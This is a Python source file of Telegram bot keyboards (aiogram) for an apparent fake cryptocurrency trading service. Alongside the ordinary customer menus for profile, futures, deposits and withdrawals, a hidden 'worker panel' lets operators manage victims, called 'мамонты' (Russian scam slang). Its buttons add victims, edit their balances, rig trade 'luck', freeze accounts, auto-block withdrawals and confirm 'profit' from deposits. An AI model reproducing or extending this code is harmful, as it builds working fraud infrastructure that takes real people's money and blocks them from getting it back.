from aiogram import types 
import data.config as config
from models import *


back = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back')

def check_deposite(id):
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='🔄 Проверить оплату', callback_data=f'check_deposite${id}')
    b2 = types.InlineKeyboardButton(text='✖️ Отменить', callback_data=f'cancel${id}')

    keyboard.add(b1)
    keyboard.add(b2)

    return keyboard

def main_reply(user_id=1):
    cfg = WorkerConfig.get_or_none(worker_id=user_id)
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    b1 = types.KeyboardButton('📂 Профиль')
    b2 = types.KeyboardButton('📊 Фьючерсы')
    b3 = types.KeyboardButton('🪙 Спот')
    b4 = types.KeyboardButton('👨🏻‍💻Тех. Поддержка')
    b5 = types.KeyboardButton('📖 Информация')
    b6 = types.KeyboardButton('⭐️ Панель воркера')

    keyboard.add(b1)
    # keyboard.add(b2, b3)
    keyboard.add(b2)
    keyboard.add(b4, b5)
    if cfg: keyboard.add(b6)

    return keyboard

def support():
    keyboard = types.InlineKeyboardMarkup()

    b = types.InlineKeyboardButton(text='👨‍💻 Тех. поддержка', url=config.SUPPORT_LINK)

    keyboard.add(b)

    return keyboard

def info():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='📄 Соглашение', url=config.agreement)
    b2 = types.InlineKeyboardButton(text='📃 Лицензия', url=config.license)

    keyboard.add(b1, b2)

    return keyboard

def start_inline():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='📄 Соглашение', url=config.agreement)
    b2 = types.InlineKeyboardButton(text='📂 Профиль', callback_data='profile')

    keyboard.add(b1)
    keyboard.add(b2)

    return keyboard

def cabinet():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='📥 Ввод', callback_data='deposite')
    b2 = types.InlineKeyboardButton(text='📤 Вывод', callback_data='withdraw')
    b3 = types.InlineKeyboardButton(text='📋 Реквезиты', callback_data='requisites')
    b4 = types.InlineKeyboardButton(text='⚙️ Настройки', callback_data='setting')


    keyboard.add(b1, b2)
    keyboard.add(b4)

    return keyboard

def setting():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='📑 Отчеты', callback_data='deposite')
    b2 = types.InlineKeyboardButton(text='💱 Валюта', callback_data='currency')
    b3 = types.InlineKeyboardButton(text='🪪 Верификация', callback_data='verificate')
    b4 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(b1, b2)
    keyboard.add(b3)
    keyboard.add(b4)

    return keyboard

def verif():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='👨‍💻 Тех. поддержка', url=config.SUPPORT_LINK)
    b2 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(b1)
    keyboard.add(b2)

    return keyboard

def currency():
    keyboard = types.InlineKeyboardMarkup()

    currencies = Currency.select()
    b1 = types.InlineKeyboardButton(text=f'{currencies[0].name}', callback_data=f'set_currency${currencies[0].id}')
    b2 = types.InlineKeyboardButton(text=f'{currencies[1].name}', callback_data=f'set_currency${currencies[1].id}')
    b3 = types.InlineKeyboardButton(text=f'{currencies[2].name}', callback_data=f'set_currency${currencies[2].id}')
    b4 = types.InlineKeyboardButton(text=f'{currencies[3].name}', callback_data=f'set_currency${currencies[3].id}')
    b5 = types.InlineKeyboardButton(text=f'{currencies[4].name}', callback_data=f'set_currency${currencies[4].id}')
    b6 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(b1, b2)
    keyboard.add(b3)
    keyboard.add(b4, b5)
    keyboard.add(b6)

    return keyboard

def futures(num):
    futures = config.crypto_list

    keyboard = types.InlineKeyboardMarkup()
    for i in range(num*5, (num+1)*5):
        future = futures[i]
        b = types.InlineKeyboardButton(text=f'{futures[i][0]}', callback_data=f'open_future${i}')
        keyboard.add(b)
    last = num - 1 if num >= 1 else 6
    next = num + 1 if num <=5 else 0

    b1 = types.InlineKeyboardButton(text=f'⬅️', callback_data=f'switch_future${last}')
    b2 = types.InlineKeyboardButton(text=f'{num+1}/7', callback_data=f'nothing')
    b3 = types.InlineKeyboardButton(text=f'➡️', callback_data=f'switch_future${next}')

    keyboard.add(b1, b2, b3)

    return keyboard
    
def back_to_futures():
    b = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_future')
    keyboard = types.InlineKeyboardMarkup()

    keyboard.add(b)

    return keyboard  
  
def back_to_menu():
    keyboard = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(back)

    return keyboard
 
def back_menu_worker():
    keyboard = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu_worker')

    keyboard.add(back)

    return keyboard

  
def cancel_worker():
    keyboard = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton(text='↪️ Назад', callback_data='cancel_work')

    keyboard.add(back)

    return keyboard

def deposite():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='💳 Фиатом', callback_data='dep_fiat')
    b2 = types.InlineKeyboardButton(text='🔹 СБП', callback_data='dep_sbp')
    b3 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(b1)
    keyboard.add(b2)
    keyboard.add(b3)

    return keyboard

def withdraw():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='🏦 Фиатом', callback_data='wit_fiat')
    b2 = types.InlineKeyboardButton(text='🪙 Криптовалюта', callback_data='wit_sbp')
    b3 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(b1, b2)
    keyboard.add(b3)

    return keyboard

def setTime():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='60 сек.', callback_data='set_time$60')
    b2 = types.InlineKeyboardButton(text='90 сек.', callback_data='set_time$90')
    b3 = types.InlineKeyboardButton(text='120 сек.', callback_data='set_time$120')
    b4 = types.InlineKeyboardButton(text='150 сек.', callback_data='set_time$150')
    b5 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(b1)
    keyboard.add(b2)
    keyboard.add(b3)
    keyboard.add(b4)
    keyboard.add(b5)

    return keyboard

def setCredit():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(text='X1.5', callback_data='set_credit$1.5')
    b2 = types.InlineKeyboardButton(text='X2', callback_data='set_credit$2')
    b3 = types.InlineKeyboardButton(text='X3', callback_data='set_credit$3')
    b4 = types.InlineKeyboardButton(text='X4.5', callback_data='set_credit$4.5')
    b5 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')

    keyboard.add(b1)
    keyboard.add(b2)
    keyboard.add(b3)
    keyboard.add(b4)
    keyboard.add(b5)

    return keyboard

def setType():
    keyboard = types.InlineKeyboardMarkup()
    b1 = types.InlineKeyboardButton(text='📈 Long', callback_data='set_type$long')
    b2 = types.InlineKeyboardButton(text='📉 Short', callback_data='set_type$short')
    b3 = types.InlineKeyboardButton(text='↪️ Назад', callback_data='back_menu')
    keyboard.add(b1, b2)
    keyboard.add(b3)

    return keyboard

def worker(worker):
    keyboard = types.InlineKeyboardMarkup()

    input = '🌕' if worker.input else '🌑'
    output = '🌕' if worker.output_block else '🌑'
    logging = '🌕' if worker.logging else '🌑'

    if worker.lucky == 2:
        luck = '100%'
    elif worker.lucky == 1:
        luck = '50% '
    else:
        luck = '0%'

    min_dep = worker.min_deposite

    b1 = types.InlineKeyboardButton(f'{input} Ввод суммы вывода', callback_data='input')
    b2 = types.InlineKeyboardButton(f'{output} Автоотключение вывода', callback_data='output_block')
    b3 = types.InlineKeyboardButton(f'{logging} Логирование', callback_data='logging')
    b4 = types.InlineKeyboardButton(f'🍀 Дефолтная удача: {luck}', callback_data='lucky')
    b5 = types.InlineKeyboardButton(f'🏧 Мин.деп для всех: {min_dep}RUB', callback_data='min_dep')
    b6 = types.InlineKeyboardButton('📬 Рассылка', callback_data='mail')
    b7 = types.InlineKeyboardButton('🦣 Мои мамонты', callback_data='mamonts')
    b8 = types.InlineKeyboardButton('➕ Добавить мамонта', callback_data='add_mamont')

    keyboard.add(b1)
    keyboard.add(b2)
    keyboard.add(b3)
    keyboard.add(b4)
    keyboard.add(b5)
    keyboard.add(b6)
    keyboard.add(b7)
    keyboard.add(b8)

    return keyboard

def mamonts_list(chats):
    keyboard = types.InlineKeyboardMarkup()
    
    for chat in chats:
        b = types.InlineKeyboardButton(f'{chat.first_name}', callback_data=f'open_mamont${chat.id}')
        keyboard.add(b)

    b = types.InlineKeyboardButton(f'Выход', callback_data=f'delete_message')
    keyboard.add(b)
    
    return keyboard


def open_mamont():
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(f'⚙️ Заморозка', callback_data='freeze')
    b2 = types.InlineKeyboardButton(f'⚙️ Верификация', callback_data='verif')
    b3 = types.InlineKeyboardButton(f'📤 Метод вывода', callback_data='output_method')
    b4 = types.InlineKeyboardButton(f'🍀 Удача', callback_data='lucky')
    b5 = types.InlineKeyboardButton('🏦 Изм. баланс', callback_data='balance')
    b6 = types.InlineKeyboardButton('💌 Сообщение', callback_data='mail')
    b7 = types.InlineKeyboardButton('🦣 Удалить', callback_data='delete')
    b8 = types.InlineKeyboardButton('🏧 Мин.деп', callback_data='min_dep')
    b9 = types.InlineKeyboardButton('⛔️ Закрыть', callback_data='close')

    keyboard.add(b1, b2)
    keyboard.add(b3, b4)
    keyboard.add(b5)
    keyboard.add(b6)
    keyboard.add(b7, b8)
    keyboard.add(b9)

    return keyboard

def send_deposite(dep_id):
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(f'💸 Отправить на проверку', callback_data=f'go_check${dep_id}')
    b2 = types.InlineKeyboardButton(f'✅ Псевдо оплата', callback_data=f'psevdo_check${dep_id}')
    b3 = types.InlineKeyboardButton(f'⛔️ Скрыть', callback_data=f'delete_check${dep_id}')

    keyboard.add(b1)
    keyboard.add(b2)
    keyboard.add(b3)

    return keyboard


def admin_profit(dep_id):
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(f'✅ Профит', callback_data=f'profit_yes${dep_id}')
    b2 = types.InlineKeyboardButton(f'❌ Отмена', callback_data=f'profit_no${dep_id}')

    keyboard.add(b1)
    keyboard.add(b2)

    return keyboard

def withdraw_admin(user_id, req, price):
    keyboard = types.InlineKeyboardMarkup()

    b1 = types.InlineKeyboardButton(f'✅ Одобрить', callback_data=f'withdraw_yes${user_id}${req}${price}')
    b2 = types.InlineKeyboardButton(f'❌ Отклонить', callback_data=f'withdraw_no${user_id}')

    keyboard.add(b1)
    keyboard.add(b2)

    return keyboard
